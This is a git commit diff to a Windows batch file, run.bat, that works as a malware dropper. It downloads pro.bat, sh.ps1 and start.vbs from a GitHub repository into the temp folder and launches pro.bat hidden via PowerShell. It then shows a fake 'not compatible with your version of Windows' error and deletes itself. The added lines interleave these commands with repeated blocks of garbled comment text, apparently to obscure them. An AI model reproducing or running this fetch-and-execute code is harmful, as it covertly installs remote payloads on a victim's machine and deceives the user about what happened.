cbb2787d15bd23facca2e73214fbab88e0854a35
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-14 03:58:39 +0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,8 +1,110 @@
 @echo off
+@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]
 curl https://raw.githubusercontent.com/0x2034/shell3/main/pro.bat -o "%temp%\pro.bat"
+@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]
 curl https://raw.githubusercontent.com/0x2034/shell3/main/sh.ps1 -o "%temp%\sh.ps1"
+@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]
 curl https://raw.githubusercontent.com/0x2034/shell3/main/start.vbs -o "%temp%\start.vbs"
+@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]
 powershell -c "Start-Process -FilePath "%temp%\pro.bat" -WindowStyle Hidden"
+@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]
 echo The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program ........
 timeout /t 2 >nul
+@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]
 del "%~f0"
